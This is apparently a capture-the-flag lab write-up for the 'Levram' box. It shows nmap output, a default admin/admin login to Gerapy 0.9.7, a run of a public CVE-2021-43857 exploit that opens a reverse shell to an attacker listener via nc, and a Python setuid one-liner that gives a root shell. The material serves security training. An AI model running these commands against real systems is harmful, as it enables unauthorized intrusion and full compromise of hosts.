# Levram

### Scan ports with nmap

```
nmap -sC -sV -A -p- -v 192.168.141.24

# Nmap 7.94SVN scan initiated Thu Apr 24 05:16:47 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -A -p- -v -o Desktop/PG/Levram/target_nmap.txt 192.168.141.24
Nmap scan report for 192.168.141.24
Host is up (0.069s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http-alt WSGIServer/0.2 CPython/3.10.6
| http-methods: 
|_  Supported Methods: GET OPTIONS
|_http-title: Gerapy
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Thu, 24 Apr 2025 09:17:36 GMT
|     Server: WSGIServer/0.2 CPython/3.10.6
|     Content-Type: text/html
|     Content-Length: 9979
|     Vary: Origin
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta http-equiv="content-type" content="text/html; charset=utf-8">
|     <title>Page not found at /nice ports,/Trinity.txt.bak</title>
|     <meta name="robots" content="NONE,NOARCHIVE">
|     <style type="text/css">
|     html * { padding:0; margin:0; }
|     body * { padding:10px 20px; }
|     body * * { padding:0; }
|     body { font:small sans-serif; background:#eee; color:#000; }
|     body>div { border-bottom:1px solid #ddd; }
|     font-weight:normal; margin-bottom:.4em; }
|     span { font-size:60%; color:#666; font-weight:normal; }
|     table { border:none; border-collapse: collapse; width:100%; }
|     vertical-align:top; padding:2px 3px; }
|     width:12em; text-align:right; color:#6
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 24 Apr 2025 09:17:31 GMT
|     Server: WSGIServer/0.2 CPython/3.10.6
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept, Origin
|     Allow: GET, OPTIONS
|     Content-Length: 2530
|_    <!DOCTYPE html><html lang=en><head><meta charset=utf-8>
```
### Check the web service on port 8000

![](./screenshot/Screenshot%202025-04-24%20at%2018.01.19.png)

Log in using common account passwords `admin/admin`

Check the service version
![](./screenshot/Screenshot%202025-04-24%20at%2018.16.18.png)

The service version is **Gerapy v0.9.7**

Search exploits
```
┌──(kali㉿kali)-[~/Desktop/PG/Levram]
└─$ searchsploit Gerapy                                     
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
Gerapy 0.9.7 - Remote Code Execution (RCE) | python/remote/50640.py
------------------------------------------- ---------------------------------
```
Achieve Remote Code Execution (RCE)
```
┌──(kali㉿kali)-[~/Desktop/PG/Levram]
└─$ python3 50640.py -t 192.168.141.24 -p 8000 -L 192.168.45.213 -P 4444
  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____ 
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ / ( _ ) ___|___  |
| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \ / _ \___ \  / / 
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) | (_) |__) |/ /  
 \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____/ \___/____//_/   
                                                                              

Exploit for CVE-2021-43857
For: Gerapy < 0.9.8
[*] Resolving URL...
[*] Logging in to application...
[*] Login successful! Proceeding...
[*] Getting the project list
[{'name': 'admin'}]
[*] Found project: admin
[*] Getting the ID of the project to build the URL
[*] Found ID of the project:  1
[*] Setting up a netcat listener
listening on [any] 4444 ...
[*] Executing reverse shell payload
[*] Watchout for shell! :)
```
Locate local.txt
```
┌──(kali㉿kali)-[~/Desktop/PG/Levram]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.141.24] 34062
app@ubuntu:~$ cat /home/app/local.txt
```
### Privilege Escalation
Use linpeas.sh to find privilege escalation vulnerabilities
![](./screenshot/Screenshot%202025-04-24%20at%2018.21.50.png)
Successfully escalate privileges via Python and Locate proof.txt
```
app@ubuntu:~/gerapy$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
cat /root/proof.txt
```

